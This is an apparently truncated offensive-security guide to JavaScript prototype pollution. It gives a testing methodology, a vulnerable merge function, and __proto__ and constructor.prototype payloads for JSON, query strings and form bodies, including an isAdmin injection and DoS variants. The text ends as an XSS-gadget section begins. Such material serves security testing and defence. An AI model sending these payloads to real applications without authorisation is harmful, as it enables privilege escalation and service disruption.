<prototype_pollution_guide>
<title>PROTOTYPE POLLUTION</title>

<critical>Prototype pollution is a JavaScript vulnerability that allows attackers to modify the prototype of base objects (Object.prototype). This can lead to property injection, denial of service, authentication bypass, and remote code execution in both client-side and server-side contexts.</critical>

<scope>
- Client-side JavaScript applications (browsers)
- Server-side Node.js applications
- JSON parsing and object merging operations
- Query string parsing libraries
- Configuration management and deep merge utilities
</scope>

<methodology>
1. Identify object merge, extend, clone, or deep copy operations accepting user input.
2. Test property injection via __proto__, constructor.prototype, or prototype paths.
3. Verify pollution by checking if injected properties appear on new objects.
4. Identify gadgets that read from polluted properties to achieve impact.
5. Chain pollution with gadgets for XSS, authentication bypass, or RCE.
</methodology>

<pollution_vectors>
<proto_property>
{% raw %}
# Direct __proto__ pollution
{"__proto__": {"polluted": true}}
{"__proto__": {"isAdmin": true}}

# Nested pollution
{"constructor": {"prototype": {"polluted": true}}}

# URL parameter pollution (query string parsers)
?__proto__[polluted]=true
?constructor[prototype][polluted]=true
?__proto__.polluted=true

# JSON pollution
JSON.parse('{"__proto__": {"polluted": true}}')
{% endraw %}
</proto_property>

<vulnerable_patterns>
{% raw %}
# Recursive merge/extend (vulnerable)
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

# Vulnerable libraries (check versions)
# - lodash (_.merge, _.set, _.setWith) - fixed in 4.17.12+
# - jQuery ($.extend) - deep extend vulnerable
# - deep-extend - vulnerable versions exist
# - defaults-deep
# - merge-deep
# - hoek - fixed versions available
{% endraw %}
</vulnerable_patterns>
</pollution_vectors>

<detection_techniques>
<basic_detection>
{% raw %}
# Client-side detection
// Before pollution
console.log({}.polluted);  // undefined

// Attempt pollution via vulnerable function
vulnerableFunction({"__proto__": {"polluted": "yes"}});

// After pollution
console.log({}.polluted);  // "yes" if vulnerable

# Node.js detection
const payload = JSON.parse('{"__proto__": {"polluted": true}}');
merge({}, payload);
console.log({}.polluted);  // true if vulnerable
{% endraw %}
</basic_detection>

<http_detection>
{% raw %}
# Test via query parameters
GET /api/endpoint?__proto__[test]=polluted HTTP/1.1

# Test via JSON body
POST /api/endpoint HTTP/1.1
Content-Type: application/json

{"__proto__": {"test": "polluted"}}

# Test via form data
POST /api/endpoint HTTP/1.1
Content-Type: application/x-www-form-urlencoded

__proto__[test]=polluted

# Response analysis
# Look for injected property in subsequent responses
# Check if error messages reference the polluted property
# Monitor for behavioral changes indicating pollution
{% endraw %}
</http_detection>

<timing_detection>
{% raw %}
# Some gadgets cause timing differences
{"__proto__": {"length": 1000000}}  # Array.prototype pollution
{"__proto__": {"0": "x"}}           # Sparse array pollution

# DoS via pollution
{"__proto__": {"toString": "malicious"}}  # Causes errors
{% endraw %}
</timing_detection>
</detection_techniques>

<client_side_exploitation>
<xss_gadgets>
{% raw %}
